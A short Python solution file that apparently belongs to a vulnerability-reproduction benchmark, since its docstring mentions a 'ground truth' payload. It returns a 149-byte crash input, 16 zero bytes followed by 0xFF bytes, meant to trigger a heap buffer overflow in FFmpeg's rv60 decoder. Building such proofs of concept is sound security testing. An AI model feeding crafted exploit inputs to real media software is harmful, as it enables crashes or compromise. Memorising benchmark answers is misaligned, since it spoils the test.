import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow in avcodec/rv60dec.
        The vulnerability allows the slice bit reader to be initialized with a size
        larger than the actual buffer, due to unchecked slice offsets in the bitstream.
        
        Strategy:
        Construct a payload of 149 bytes (matching ground truth).
        Use a header of null bytes to pass initial type/dimension checks (interpreting as small/default).
        Follow with 0xFF bytes to ensure that parsed slice offsets/sizes are interpreted as
        very large integers, triggering the vulnerability in the unpatched version.
        """
        # 16 bytes of zeros for header structures
        # 133 bytes of 0xFF to force large offset calculations
        return b'\x00' * 16 + b'\xff' * 133